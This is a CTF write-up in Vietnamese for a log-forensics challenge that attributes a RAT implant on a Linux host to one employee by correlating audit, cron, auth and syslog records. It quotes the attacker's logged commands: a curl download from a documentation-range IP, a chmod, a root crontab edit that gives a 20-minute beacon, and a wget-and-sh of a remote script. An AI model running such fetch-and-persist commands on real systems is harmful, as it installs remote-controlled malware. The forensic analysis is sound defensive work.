# Corporate RAT - Log Analysis (500 điểm)

**Cờ:** `cdctf{Lamar Hackson}` · **File:** `corpo_rat.zip` (128747 B, SHA-256 `5109835422566de5...486a45f7f6c5a66`)
**Bên trong:** `audit.log`, `auth.log`, `cron.log`, `syslog`, `users.txt` (roster 98 nhân viên)

## Đề bài

Bốn file log của cùng một host `ubnt-app02` (auditd, sshd/sudo, cron, syslog) kèm danh sách 98
nhân viên. Một người trong số đó đã để RAT trên máy chủ và làm lộ tài liệu ra ngoài. Nhiệm vụ là
chỉ đúng người, cờ là họ tên trong roster, format `cdctf{Firstname Lastname}`.

## Phân tích ban đầu

Đếm sự kiện theo loại trong `audit.log`:

| Record | Số lượng | Ghi chú |
| --- | --- | --- |
| SYSCALL | 2148 | 1136 trong đó là `comm=".upd"` |
| EXECVE | 574 | 568 là `/tmp/.cache/.upd`, còn lại 6 lệnh one-off |
| SOCKADDR | 569 | chỉ 2 đích, đều là `203.0.113.77` |
| USER_LOGIN | 155 | sshd success, có `auid=` |
| USER_CHAUTHTOK | 1 | `op=crontab-edit` |
| PATH | 3 | `/tmp/.cache/.upd`, `/var/spool/cron/crontabs/root`, `/tmp/agent.sh` |
| CONFIG_CHANGE | 4 | `op=add_rule`, không có `auid` |

Nhịp bình thường của log là các shell command lặp lại với số lượng tương đương nhau (`git` 114,
`python3` 109, `ls` 104, `apt-get` 100, `systemctl` 98, `ssh` 98, `tail` 97, `vim` 96, `top` 96,
`psql` 95). Hai thứ lệch khỏi nhịp đó: một binary ẩn chạy gấp nhiều lần mọi lệnh khác, và sáu lệnh
one-off. Bốn trong sáu lệnh đó, `curl`, `chmod`, `crontab`, `ls -la /tmp/.cache/`, mang cùng một
`auid`; hai lệnh còn lại, `wget` và `sh`, thuộc về một người khác.

```bash
grep -oP 'comm="\K[^"]+' audit.log | sort | uniq -c | sort -rn | head -6
```

```text
   1136 .upd
    114 git
    109 python3
    104 ls
    100 apt-get
     98 systemctl
```

```bash
grep -oP 'saddr=\K[0-9A-F]+' audit.log | sort | uniq -c
```

```text
      1 020020FBCB00714D0000000000000000
    568 02002157CB00714D0000000000000000
```

`audit.log` mã hoá `saddr` cho AF_INET thành family 2 byte little-endian, port 2 byte big-endian,
rồi 4 byte IPv4 big-endian. `0200 2157 CB00714D` là `203.0.113.77:8535`, `0200 20FB CB00714D` là
`203.0.113.77:8443`. Cùng một IP cho cả hai: một kết nối ở cổng download và 568 kết nối ở cổng
beacon. Trong `cron.log`, 569 dòng `CMD (/tmp/.cache/.upd >/dev/null 2>&1)` giải thích cả hai con
số: implant được cron của root gọi, mỗi lần gọi mở một kết nối beacon.

## Các hướng đã loại

Ba kênh trông giống attacker nhưng không dẫn tới implant (chi tiết trong `notes.md`):

1. **`gfoster` (George Foster, uid 1097)**: `wget -q http://198.51.100.44/tools/monitoring-agent.sh
   -O /tmp/agent.sh` rồi `sh /tmp/agent.sh`, sau đó `/bin/rm /tmp/agent.sh`. Anh ta có sudo thật
   (`sudo=yes` trong roster), đăng nhập từ đúng workstation 10.50.20.125 của mình, và chuỗi lệnh chỉ
   chạy một lần: 0 dòng cron, 0 beacon.
2. **User ngoài `newhire`**: chỉ có một dòng `useradd` do `lroberts` chạy ngày 25/09, không có phiên
   login và không có record audit nào mang uid của user này.
3. **Scanner từ `198.51.100.x` và `203.0.113.x`**: 106 dòng UFW BLOCK trong `syslog` và các dòng
   `Invalid user` trong `auth.log`. Toàn bộ 457 dòng `Accepted password` đều đến `10.50.x.x`, không
   IP nào trong nhóm quét lấy được phiên.

## Chuỗi khai thác

**Bước 1 - Liên kết implant với tài khoản đăng nhập.** Record `crontab` trong `audit.log` mang
`auid` (login uid gốc), còn `uid=0` chỉ cho biết lệnh chạy qua sudo. Dòng `REPLACE` trong `cron.log`
cho biết pid của chính tiến trình `crontab` đã sửa crontab của root, nên pid đó nối hai file lại:

```bash
grep -n 'crontab\[4711\]' cron.log
grep 'USER_CHAUTHTOK' audit.log
```

```text
51:Sep 20 02:17:46 ubnt-app02 crontab[4711]: (root) REPLACE (root)
52:Sep 20 02:17:47 ubnt-app02 CRON[612]: (root) RELOAD (crontabs/root)
type=USER_CHAUTHTOK msg=audit(1789870666.000:101175): pid=4711 uid=0 auid=1066 ses=5071 msg='op=crontab-edit exe="/usr/bin/crontab" res=success'
```

`auid=1066` tra trong `users.txt` ra `lhackson 1066 Lamar Hackson Finance no /bin/bash`.

**Bước 2 - Xác nhận cùng auid đó đã tải và bật quyền implant.** Ba record EXECVE ngay trước
`USER_CHAUTHTOK`, mỗi record có SYSCALL đi kèm mang `auid=1066 uid=0 tty=pts4 ppid=4344`:

```text
type=EXECVE msg=audit(1789870512.000:101167): argc=5 a0="curl" a1="-s" a2="-o" a3="/tmp/.cache/.upd" a4="http://203.0.113.77:8443/update"
type=EXECVE msg=audit(1789870539.000:101170): argc=3 a0="chmod" a1="+x" a2="/tmp/.cache/.upd"
type=EXECVE msg=audit(1789870631.000:101173): argc=4 a0="crontab" a1="-u" a2="root" a3="-e"
type=PATH msg=audit(1789870539.000:101171): item=0 name="/tmp/.cache/.upd" inode=881422 dev=08:01 mode=0100755 ouid=0 ogid=0
```

Cổng 8443 trong URL khớp record SOCKADDR duy nhất không phải beacon, và `mode=0100755 ouid=0` khớp
lệnh `chmod` ngay sau đó.

**Bước 3 - Đối chiếu `auth.log`.** sudo ghi lại đúng ba lệnh trên theo từng phút, và `ppid=4344`
trong audit chính là pid của tiến trình sshd mở phiên đó:

```text
Sep 20 02:14:11 ubnt-app02 sshd[4344]: Failed password for lhackson from 10.50.44.233 port 55210 ssh2
Sep 20 02:14:14 ubnt-app02 sshd[4344]: Accepted password for lhackson from 10.50.44.233 port 55210 ssh2
Sep 20 02:14:16 ubnt-app02 systemd-logind[890]: New session 50695 of user lhackson.
Sep 20 02:14:30 ubnt-app02 sudo: lhackson : user NOT in sudoers ; TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/usr/bin/apt-get install netcat-traditional
Sep 20 02:15:12 ubnt-app02 sudo: lhackson : TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
Sep 20 02:15:39 ubnt-app02 sudo: lhackson : TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/.upd
Sep 20 02:17:10 ubnt-app02 sudo: lhackson : TTY=pts/4 ; PWD=/home/lhackson ; USER=root ; COMMAND=/usr/bin/crontab -u root -e
Sep 20 02:26:15 ubnt-app02 sshd[4344]: pam_unix(sshd:session): session closed for user lhackson
```

Các chi tiết bổ sung liên quan đến cùng tài khoản: IP 10.50.44.233 chỉ xuất hiện 2 lần trong toàn bộ
`auth.log` và đều là phiên này (9 phiên còn lại của `lhackson` đến từ 10.50.12.188); 455 session
khác trong log được systemd-logind đánh số liên tục từ 40000 đến 40454, chỉ phiên này nhận 50695;
ngày 23/09 chính user này chạy `sudo /bin/ls -la /tmp/.cache/`, tức quay lại kiểm tra thư mục chứa
implant; `audit.log` ghi cùng lệnh đó ở record 101181-101182 với `auid=1066 uid=0 tty=pts2`.

Chuỗi độc lập với cột `sudo` trong roster: `lhackson` mang `sudo=no` và lệnh đầu tiên bị từ chối
`user NOT in sudoers`, ba lệnh sau lại chạy thành công với `USER=root`. Log không ghi lại bước trung
gian nào giữa hai trạng thái đó, và điều đó không ảnh hưởng tới attribution vì bằng chứng gốc là
`auid` trong audit record, không phải dòng sudo.

**Bước 4 - Kiểm chứng nhịp beacon.** `analysis/beacons.py` decode toàn bộ SOCKADDR và nối với
`cron.log`:

```bash
python analysis/beacons.py files/corpo_rat.zip
```

```text
203.0.113.77:8535  568 ket noi
  tu Sep 20 02:43:01 UTC -> Sep 27 23:44:50 UTC
  gap min/median/max = 1140/1200/1260 s
203.0.113.77:8443  1 ket noi

cron.log: 569 lan cron root chay /tmp/.cache/.upd
  lan dau : Sep 20 02:43:00 CRON[7741]
  lan cuoi: Sep 27 23:49:26 CRON[28467]
  tong so SOCKADDR trong audit.log = 569
```

Beacon đầu tiên xuất hiện 1 giây sau dòng cron đầu tiên, nhịp 20 phút, và 568 EXECVE = 568 SOCKADDR:
mỗi lần implant chạy để lại đúng một kết nối trong audit.

Đối chiếu thêm với `syslog`: 570 dòng UFW ALLOW, tất cả tới `203.0.113.77`.

```bash
awk '/UFW ALLOW/ {d="";p="";t="ACK";for(i=1;i<=NF;i++){if($i~/^DST=/)d=$i;if($i~/^DPT=/)p=$i;if($i=="SYN")t="SYN"}; print d,p,t}' syslog | sort | uniq -c
```

```text
    569 DST=203.0.113.77 DPT=8443 ACK
      1 DST=203.0.113.77 DPT=8443 SYN
```

Một dòng SYN duy nhất lúc `Sep 20 02:15:13` ứng với kết nối tải payload, 569 dòng ACK ứng với 569
lần cron gọi implant, dòng ACK đầu tiên lúc `Sep 20 02:43:00` trùng giây với dòng cron đầu tiên.
Cổng trong hai file không khớp nhau (syslog ghi 8443 cho cả beacon, audit ghi 8535), và audit thiếu
một kết nối ở cuối cửa sổ, nên con số dùng để đối chiếu được là IP và số lần kết nối, không phải cổng.

## Flag

Toàn bộ output của `python exploit.py files/corpo_rat.zip`:

```bash
python exploit.py files/corpo_rat.zip
```

```text
[*] doc artifact: files\corpo_rat.zip
[*] audit.log: 3454 dong
[*] auth.log: 3948 dong
[*] cron.log: 679 dong
[*] syslog: 944 dong
[*] users.txt: 100 dong
[*] roster: 98 user, uid 1000-1097
[*] audit.log: 574 EXECVE, 2148 SYSCALL, 569 SOCKADDR
[+] buoc 1: /tmp/.cache/.upd duoc EXECVE 568 lan, comm=".upd"
[+] buoc 2: 569 SOCKADDR -> 2 dich: 203.0.113.77:8535 x568, 203.0.113.77:8443 x1
[+] buoc 2: C2 = 203.0.113.77:8535 (568 lan beacon)
[+]         lenh tai: curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
[+]         lenh tai: wget -q http://198.51.100.44/tools/monitoring-agent.sh -O /tmp/agent.sh
[+] buoc 3: cron.log co 569 dong CMD (/tmp/.cache/.upd ...)
[+] cron.log: crontab[4711] (root) REPLACE (root) - sua crontab cua root
[+] buoc 4: USER_CHAUTHTOK pid=4711 auid=1066 op=crontab-edit
[+]         auid 1066 -> uid 1066 = lhackson = Lamar Hackson
[+] buoc 5: audit:101167 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
[+] buoc 5: audit:101170 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=chmod +x /tmp/.cache/.upd
[+] buoc 5: audit:101173 auid=1066 uid=0 tty=pts4 ppid=4344 cmd=crontab -u root -e
[+] buoc 6: auth.log, sudo ghi boi lhackson:
    Sep 20 02:14:30  sudo lhackson : USER=root ; COMMAND=/usr/bin/apt-get install netcat-traditional
    Sep 20 02:15:12  sudo lhackson : USER=root ; COMMAND=/usr/bin/curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update
    Sep 20 02:15:39  sudo lhackson : USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/.upd
    Sep 20 02:17:10  sudo lhackson : USER=root ; COMMAND=/usr/bin/crontab -u root -e
    Sep 23 13:22:07  sudo lhackson : USER=root ; COMMAND=/bin/ls -la /tmp/.cache/
[+]         3 lenh cai implant co mat nguyen van trong sudo.log
[+] buoc 7: lhackson vung ve 10.50.12.188 (9 phien)
    Sep 20 02:14:14  sshd[4344] Accepted password for lhackson from 10.50.44.233
    IP 10.50.44.233 xuat hien 2 dong trong auth.log, chi phuc vu ['lhackson']
[+]         audit SYSCALL co ppid thuoc sshd['4344']: 3 dong, auid = [1066] (ppid trong audit = pid cua sshd)
[+] buoc 8: curl uid=0 -> /tmp/.cache/.upd | cron=569, EXECVE=568 -> implant
[+] buoc 8: wget uid=0 -> /tmp/agent.sh | cron=0, EXECVE=0 -> loai: tai mot lan, khong cron, khong beacon
[+] nhan: lhackson (uid 1066), Lamar Hackson, Finance, sudo=no
[+] flag: cdctf{Lamar Hackson}
[+] da luu flag.txt
```

## Reproduce

```bash
unzip corpo_rat.zip                 # 5 file vào thư mục con corpo_rat/
python exploit.py files/corpo_rat.zip
python analysis/beacons.py files/corpo_rat.zip
```

`exploit.py` cũng nhận đường dẫn thư mục thay cho zip: `python exploit.py ../corpo_rat`.
Toàn bộ suy diễn đi từ năm file log và `users.txt`; các grep trong writeup chạy trực tiếp trên
`audit.log`, `cron.log` và `syslog` đã giải nén.
